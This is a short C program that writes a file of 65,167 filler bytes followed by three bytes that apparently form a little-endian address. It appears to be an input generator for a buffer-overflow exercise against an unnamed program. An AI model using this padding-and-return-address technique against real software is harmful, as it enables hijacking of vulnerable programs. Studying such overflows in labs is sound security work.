#include <stdio.h>
#include <stdlib.h>

int main ()
{
    FILE *file = fopen ("a.txt", "wb");
    for (int i = 0; i < 65167; i++) fputc('v',file);
    fputc (0x01, file);
    fputc (0x21, file);
    fputc (0x0D, file);
    fclose (file);
    return EXIT_SUCCESS;
}